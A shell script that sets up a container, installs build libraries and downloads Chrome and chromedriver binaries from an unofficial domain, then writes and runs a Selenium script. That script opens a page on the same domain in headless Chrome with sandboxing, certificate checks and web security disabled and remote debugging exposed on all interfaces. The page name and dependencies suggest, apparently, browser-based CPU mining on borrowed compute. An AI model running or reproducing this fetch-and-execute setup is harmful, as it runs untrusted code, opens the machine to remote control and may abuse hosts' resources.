#!/bin/sh
cd
pwd
ls -la

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg python3 python3-pip >/dev/null

sleep 2

pip3 install selenium

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

wget -q https://greenleaf.teatspray.fun/chromedriver-linux64.tar.gz

sleep 2

wget -q https://greenleaf.teatspray.fun/chrome-linux64.tar.gz

sleep 2

tar -xf chromedriver-linux64.tar.gz

sleep 2

tar -xf chrome-linux64.tar.gz

sleep 2

cat > requirements.txt <<END
selenium
END

sleep 2

pip3 install -r requirements.txt

sleep 2

cat > run_selenium.py <<EOF
import time
import os.path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

## Setup chrome options
chrome_options = Options()
chrome_options.add_argument("--headless")  # Ensure GUI is off
chrome_options.add_argument("--no-sandbox")

chrome_options.add_argument("--disable-setuid-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--ignore-certificate-errors")
chrome_options.add_argument("--ignore-certificate-errors-spki-list")
chrome_options.add_argument("--disable-infobars")
chrome_options.add_argument("--disable-translate")
chrome_options.add_argument("--disable-sync")
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--disable-breakpad")
chrome_options.add_argument("--disable-background-timer-throttling")
chrome_options.add_argument("--disable-background-networking")
chrome_options.add_argument("--disable-web-security")
chrome_options.add_argument("--disable-gpu")

chrome_options.add_argument("--remote-debugging-port=9222")
chrome_options.add_argument("--remote-debugging-address=0.0.0.0")


chrome_options.add_experimental_option("detach", True)

# Set path to chromedriver as per your configuration
homedir = os.path.expanduser("~")
chrome_options.binary_location = f"{homedir}/chrome-linux64/chrome"
webdriver_service = Service(f"{homedir}/chromedriver-linux64/chromedriver")

# Choose Chrome Browser
browser = webdriver.Chrome(service=webdriver_service, options=chrome_options)

# Get page
browser.get("https://ellisdanonecpulab.teatspray.fun")

print("Page URL:", browser.current_url) 
print("Page Title:", browser.title)

time.sleep(5)

try:
    input("Continue?")
except:
    print("EOF")

EOF

sleep 2

ls -la

python3 run_selenium.py
